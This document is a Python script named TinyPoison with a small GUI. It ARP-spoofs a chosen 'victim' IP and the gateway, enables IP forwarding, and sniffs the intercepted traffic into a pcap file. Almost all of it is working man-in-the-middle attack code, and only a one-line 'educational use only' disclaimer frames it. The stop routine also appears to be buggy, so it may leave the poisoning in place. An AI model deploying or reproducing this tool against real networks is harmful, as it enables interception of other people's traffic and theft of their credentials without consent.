#!/usr/bin/env python3

'''
	TinyPoison
	By 1024m
	
	This application is intended for EDUCATIONAL USE ONLY.
	I am in no way responsible for your use of this program.
	
	config.json:
		output_file_name: The filename you want to output to
		auto_detect_interface: Have TinyPoison auto-detect your default wireless interface and gateway IP
			wireless_interface: If auto_detect_interface is not true, TinyPoison will fall back to this interface.
			router_ip: If auto_detect_interface is not true, TinyPoison will assume this is the gateway IP
		victim_ip: If this is not set to ask, it is the IP attacked by TinyPoison
'''

try:
	import os, json, sys, netifaces
	from tkinter import *
	from scapy.all import *
except:
	print("Couldn't load libraries!")
	print("Please make sure you have the following libs installed:")
	print("os json sys netifaces scapy tkinter")
	sys.exit(1)

# Function to get MAC address from IP (duh)
def get_mac_addr(IP):
	try:
		ans, unans = arping(IP)
		for s, r in ans:
			return r[Ether].src
	except:
		print("Error getting mac addr. for IP \"" + IP + "\"")
		sys.exit(1)

def spoof(router_ip_address, victim_ip_address):
	# Get MAC addresses
	victimMAC = get_mac_addr(victim_ip_address)
	routerMAC = get_mac_addr(router_ip_address)
	# Spoof the ARP things
	try:
		send(ARP(op =2, pdst = victim_ip_address, psrc = router_ip_address, hwdst = victimMAC))
		send(ARP(op = 2, pdst = router_ip_address, psrc = victim_ip_address, hwdst = routerMAC))
	except:
		print("Error sending spoofed ARP packets.")
		sys.exit(1)

def undo_arp_poison(router_ip_address, victim_ip_address):
	# Reversed spoof() function
	victimMAC = get_mac_addr(victim_ip_address)
	routerMAC = get_mac_addr(router_ip_address)
	try:
		send(ARP(op = 2, pdst = router_ip_address, psrc = victim_ip_address, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
		send(ARP(op = 2, pdst = victim_ip_address, psrc = router_ip_address, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
	except:
		print("Error undoing ARP spoof.")
		sys.exit(1)

# Packet sniffer
def sniffer():
	try:
		pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
		wrpcap(output_file_name, pkts)
	except:
		print("Error sniffing packets.")
		sys.exit(1)

def stop_spoof():
	undo_arp_poison(router_ip_address, victim_ip_address) # Cure ARP poisoning
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") # Undo setup
	sys.exit(1) # Exit

# Actually do the ARP poisoning
def spoof_arp():
	victim_ip_address = victim_input.get()
	spoof_button.config(text="Stop", command=stop_spoof)
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # Setup
	while 1:
		try:
			spoof(router_ip_address, victim_ip_address) # Poison ARP
			time.sleep(1) # Wait
			sniffer() # Sniff for packets
		except:
			print("Unknown error.")
			sys.exit(1)

if __name__ == "__main__":
	print("TinyPoison 1.2")
	
	# Load config
	try:
		with open("config.json") as configfile:
			config = json.load(configfile)
	except:
		print("Error loading config.json")
		sys.exit(1)
		
	# Get network interface + gateway IP address
	gws = netifaces.gateways()
	if(config["auto_detect_interface"] == "true"):
		try:
			interface = gws['default'][netifaces.AF_INET][1]
			print("Interface autodetected: " + interface)
			router_ip_address = gws['default'][netifaces.AF_INET][0]
			print("Gateway IP found: " + router_ip_address)
		except:
			print("Error getting interface and gateway IP.")
	else:
		interface = config["wireless_interface"]
		router_ip_address = config["router_ip"]
		
	# Set output file name
	output_file_name = config["output_file_name"]
	print("Output file name set to: " + output_file_name)
	
	# Create window contents
	root = Tk()
	Label(root, text="Network interface:").pack()
	interface_input = Entry(root)
	interface_input.pack()
	interface_input.insert(0, interface)
	Label(root, text="Gateway IP address:").pack()
	gateway_input = Entry(root)
	gateway_input.pack()
	gateway_input.insert(0, router_ip_address)
	Label(root, text="Output file name:").pack()
	output_input = Entry(root)
	output_input.pack()
	output_input.insert(0, output_file_name)
	Label(root, text="Victim IP address:").pack()
	victim_input = Entry(root)
	victim_input.pack()
	if(config["victim_ip"] == "ask"):
		victim_input.insert(0, "Victim IP Here")
	else:
		victim_input.insert(0, config["victim_ip"])
	spoof_button = Button(root, text="Spoof", command=spoof_arp)
	spoof_button.pack()
	root.mainloop()
